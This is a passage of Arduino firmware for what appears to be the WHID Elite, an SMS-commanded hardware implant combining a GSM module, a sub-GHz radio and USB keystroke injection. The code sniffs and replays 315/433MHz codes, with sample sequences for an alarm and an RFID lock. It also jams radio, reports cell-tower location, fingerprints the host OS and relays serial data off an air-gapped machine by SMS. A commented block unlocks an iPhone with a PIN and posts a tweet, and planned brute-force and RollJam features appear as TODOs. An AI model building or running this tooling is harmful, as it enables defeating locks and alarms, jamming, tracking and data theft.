          //Example: askrx:10000 will sniff for 10 seconds.
          Serial.print(F("Milliseconds of Sniffing: "));
          Serial.println((smsBuffer + 11));
          RF.enableReceive(0); //We use D3, which is INT0, atmega32u4 chip pin #18
          RF.enableTransmit(11); //Pin D7 or D11
          RF.setRepeatTransmit(50); 
          delay(1000);
          unsigned long t = millis();
          //Hardcoded for now to 30s
          while (millis() - t < 30000) {
            //while(millis() - t < (smsBuffer+11)){
            unsigned long value;
            value = RF.getReceivedValue();
            if (value) {
                    Serial.println(F("[O] Sending back the packet sniffed in 3 seconds..."));
                    delay(1000);
                    Serial.println(F("[O] Sending back the packet sniffed in 2 seconds..."));
                    delay(1000);
                    Serial.println(F("[O] Sending back the packet sniffed in 1 second..."));
                    delay(1000);
                    Serial.println(F("[O] BOOOM!"));
                    //fona.sendSMS(callerIDbuffer, value);
                    fona.sendSMS(callerIDbuffer, tobin32(value));
//                  delay(2000);
//                  fona.sendSMS(callerIDbuffer, "Fire In The Hole!");
//                  delay(1000);
                    for (int i = 0; i <= 5; i++) {
                    //for (int i = 1; i <= 5; i++) { // we don't care to send the same packet sniffed. For Boom PoC.
                      fona.sendSMS(callerIDbuffer, tobin32(value + i));
                      delay(1500);
                      RF.send(value + i, 24);
                      Serial.print(F("Sending: "));
                      Serial.println(value + i);
                      //delay(1500);
                    }
                    Serial.println(F("[O] Packets Sent!"));
                    Serial.println(F("-----------------------------------------------------------------------------------------------------"));
                    // reset the switch to allow more data to come
                    RF.resetAvailable();
            } else {
                    //Serial.print(F("Packet Received: Unknown encoding"));
            }
          }
          RF.disableTransmit();
          RF.disableReceive();
        }        
        //####### asktxD3: #############################################################################
        //# Transmit on Pin D3 325/433MHz an arbitrary binary sequence with OOK/ASK Encoding/Modulation
        //##############################################################################################
        // ############################################################################################################################
        // #### For some reasons there is a bug... rcswitch adds one zero more... so remove the last one from the signal binary!!! ####
        // ############################################################################################################################
        // ### Example: ###
        // 1010010111101011000001000 // original signal
        // 101001011110101100000100 //to use (see! one zero less at the end)
        // Hard-coded binary sequence for testing purposes.
        // RF.send("101001011110101100000100");  // GSM Alarm at 433MHz
        // RF.send("010101010101010100001100");  // RFID RFLock at 315MHz
        else if (strncmp(smsBuffer, "asktxD3:", 8) == 0) {
          delay(1000);
          // Transmitter is connected to Atmega 32u4 Pin D3
          // Wiring of external 433/315MHz TX:
          // GND  >> GND
          // DATA >> D3
          // VCC  >> VCC
          RF.enableTransmit(3); //Pin D3
          // Optional set protocol (default is 1, will work for most outlets)
          // RF.setProtocol(2);
          // Optional set pulse length. (this must be set after protocol (if set). Otherwise is overridden).
          // RF.setPulseLength(456);
          // Optional set number of transmission repetitions.
          RF.setRepeatTransmit(50);  //##################### Number of Times the binary sequence will be transmitted. Default: 1 #################
          // Use this to add manually specific HIGH or LOW pulses with specific length.
          //      int highLength = 4;
          //      int lowLength = 18;
          //      digitalWrite(3, HIGH);
          //      delayMicroseconds(highLength*timeDelay);
          //      digitalWrite(3,LOW);
          //      delayMicroseconds(lowLength*timeDelay);
          //RF.send("101001011110101100000100"); //Hardcoded binary sequence for testing purposes.
          //RF.send(5393, 24); //Example of sending decimal value. Where 24 is the code lenght.
          RF.send((smsBuffer + 8));
          RF.disableTransmit();
          delay(1000);
        }
        //####### jamD11: ##################################
        //# It jams for certain amount of time, on Pin D11
        //##################################################
        else if (strncmp(smsBuffer, "jamD11:", 7) == 0) { // Maybe... jamXXX: commands requires the USB connector to be plugged into a PC, cause not enough V||A from LiPo?!
          delay(1000);
          Serial.print(F("Milliseconds of Jamming: "));
          Serial.println((smsBuffer + 7));
          //tone(11, 15000, 10000);
          tone(11, 15000, int(smsBuffer+7)); // It generates a square wave on Pin11. tone(pin, frequency, duration) duration is in milliseconds. (Max value 4.294.967.295)
          delay(1000);
        }
        //####### jamD7: ##################################
        //# It jams for certain amount of time, on Pin D7
        //#################################################
        else if (strncmp(smsBuffer, "jamD7:", 6) == 0) {
          delay(1000);
          Serial.print(F("Milliseconds of Jamming: "));
          Serial.println((smsBuffer + 6));
          tone(7, 15000, 10000);
          //tone(11, 15000, int(smsBuffer+7)); // It generates a square wave on Pin11. tone(pin, frequency, duration) duration is in milliseconds. (Max value 4.294.967.295)
          delay(1000);
        }
        //####### askrx: #####################################################
        //# It listens the air and tries to decode ASK/OOK traffic
        //####################################################################
        else if (strncmp(smsBuffer, "askrx:", 6) == 0) {
          //Example: askrx:10000 will sniff for 10 seconds.
          Serial.print(F("Milliseconds of Sniffing: "));
          Serial.println((smsBuffer + 6));
          RF.enableReceive(0); //We use D3, which is INT0, atmega32u4 chip pin #18
          delay(1000);
          unsigned long t = millis();
          //Hardcoded for now to 30s
          while (millis() - t < 30000) {
            //while(millis() - t < (smsBuffer+6)){
            unsigned long value;
            value = RF.getReceivedValue();
            if (value) {
              Serial.println(F("[+] Packet Received! Sending SMS!"));
              //########################################################
              //#### Keep it Commented to avoid memory consumption! ####
              //####              Use for DEBUG ONLY                ####
              //########################################################
              //char str[120];
              //sprintf(str, "[+] Packet Received: %s / %010lu / %02d bit / Protocol = %d", tobin32(value), value, RF.getReceivedBitlength(), RF.getReceivedProtocol() );
              if (!fona.sendSMS(callerIDbuffer, tobin32(value))) {
              //if (!fona.sendSMS(callerIDbuffer, value)) {  //Instead of sending binary, we send decimal. Easier to read.
                Serial.println(F("SMS Failed!"));
              }
              else {
                Serial.println(F("SMS Sent!"));
              }
            } else {
              //Serial.println(F("[-] Packet Received: Unknown encoding (0)"));
            }
            //Serial.println(str);
            //Reset the switch to allow more data to come
            RF.resetAvailable();
          }
          RF.disableReceive();
        }
    
        //------------------------------------------------------------------------------------------
        //----------------------------------   WORK IN PROGRESS   ----------------------------------
        //------------------------------------------------------------------------------------------
        //### TODO: Bruteforcing functionality
        //        else if (strncmp(smsBuffer,"brute:", 6)==0) {
        //            delay(500);
        //            Serial.print(F("BruteForcing Packet: "));
        //            Serial.println((smsBuffer+6));
        //            //### TODO-1: Add here loop that bruteforces input packet.
        //            //### TODO-2: Add advanced bruteforcing (i.e. De-brujin style)
        //            //### TODO-3: Add smart bruteforcing. Define SMS syntax to tell arduino which parts of the packet must be fuzzed.
        //            delay(1000);
        //          }
    //### TODO: Add RollJam Attack feature.
        //------------------------------------------------------------------------------------------
        //---------------------------------- END WORK IN PROGRESS ----------------------------------
        //------------------------------------------------------------------------------------------
        //-------------------------- End Of 315/433MHz STUFF -------------------------------------------------
        
        //####### getlocation: ########################################################
        //# It queries the BTS/BSC for the CellTower coordinates and send back to you!
        //#############################################################################
        else if (strncmp(smsBuffer, "getlocation:", 12) == 0) {
          //enable GPRS
          if (!fona.enableGPRS(true))
            Serial.println(F("Failed to turn on GPRS"));
          //Get GPS coordinates
          char replybuffer[50];
          uint16_t returncode;
          delay(1500);
          if (!fona.getGSMLoc(&returncode, replybuffer, 50))
            Serial.println(F("Failed!"));
          if (returncode == 0) {
            Serial.println(replybuffer);
          }
          else {
            Serial.print(F("Fail code #"));
            Serial.println(returncode);
          }
          delay(1500);
          //disable GPRS
          if (!fona.enableGPRS(false))
            Serial.println(F("Failed to turn off GPRS"));
          //send SMS
          delay(1500);
          fona.sendSMS(callerIDbuffer, replybuffer);
        }
        //####### enumos: ##########
        //# Enumerate Target's OS
        //##########################
        else if (strncmp(smsBuffer, "enumos:", 7) == 0) {
          delay(500);
          String os;
          FingerprintUSBHost.guessHostOS(os);
          char opsys[os.length() + 1];
          os.toCharArray(opsys, os.length() + 1);
          delay(200);
          fona.sendSMS(callerIDbuffer, opsys);
        }
        //####### batt: ############
        //# Get Battery Percentage
        //##########################
        else if (strncmp(smsBuffer, "batt:", 5) == 0) {
          uint16_t vbat;   
          delay(500);
          //fona.getBattVoltage(&vbat);
          fona.getBattPercent(&vbat);
          uint8_t tbat = (uint8_t)vbat;
          String batt = String(tbat);
          char battZ[batt.length() + 1];
          batt.toCharArray(battZ, batt.length() + 1);
          fona.sendSMS(callerIDbuffer, battZ);
          Serial.print(F("Batt % = "));
          Serial.println(battZ);     
         }
        //####### iOS_Troll: ##########################################################################
        //# Simple PoC for trolling iOS user. 
        //##########################################################################################
        //##########################################################################################
/*       else if (strncmp(smsBuffer, "iOS_Unlock:", 11) == 0) {
          // It opens a shell and executes the payload contained into the SMS
          delay(4000);
          Keyboard.press((char) 217); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          Keyboard.press((char) 217); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          delay(4000);
          Keyboard.press((char) 217); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          Keyboard.print("1");
          delay(300);
          Keyboard.print("2");
          delay(300);
          Keyboard.print("3");
          delay(300);
          Keyboard.print("4");
          delay(300);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 32); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          Keyboard.print("twitter");
          delay(700);
          Keyboard.press((char) 217); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          Keyboard.press((char) 217); //In Decimal, is SPACE
          Keyboard.releaseAll();
      //          delay(700);
      //          Keyboard.press((char) 217); //In Decimal, is SPACE
      //          Keyboard.releaseAll();
      //          delay(700);
      //          Keyboard.press((char) 217); //In Decimal, is SPACE
      //          Keyboard.releaseAll();
          delay(700);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 110); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(700);
          Keyboard.print("Also my iPhoneX got hacked by @WHID_Injector #WHIDElite!");
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 176); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(1500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 104); //In Decimal, is SPACE
          Keyboard.releaseAll();
        } */
        else {
          /*
          //Either Spam or Wrong Command Received. Fuck off.
          if (!fona.sendSMS(callerIDbuffer, "What?")) {
            Serial.println(F("SMS Fail"));
          }
          else {
            Serial.println(F("SMS OK"));
          }*/
          if(dontSMS != 1)
            dontSMS=2;
          Serial.println(F("No reply!"));
        }
      }
    
      String cmd = Serial.readStringUntil(':');
      if (cmd == "BAG") {
        String BypassAirGap = Serial.readStringUntil('\n');
        fona.sendSMS(callerIDbuffer, BypassAirGap.c_str());
      }
      delay(500);
      //Ack received message.(Comment it if wanna save SMSes)
      if(dontSMS == 0)
        fona.sendSMS(callerIDbuffer, "CMD ACKed & EXECed");
      else if(dontSMS == 2)
        dontSMS = 0;
      
      delay(1500);
      fonaSerial->print("AT+CMGDA=\"DEL ALL\"\r\n");

      /*
      // Let's delete the original msg after it is processed. Otherwise, we will fill up all the slots (i.e. max. 20 SMSes IIRC) and then, we won't be able to receive SMS anymore.
      // In case you notice the following behaviour: you send commands over SMS nad WHID elite do not reply... it might be that all slots are full.
      // You need to uplaod the WHIDElite_TestSuite.v.1.1.ino and delete manually all stored SMSes.
      if (fona.deleteSMS(slot)) {
        Serial.println(F("SMS removed from WHID Elite!"));
      } else {
        Serial.print(F("Couldn't delete SMS in slot: ")); Serial.println(slot);
        fona.print(F("AT+CMGD=?\r\n"));
      }
      */
     
    }
  }
}
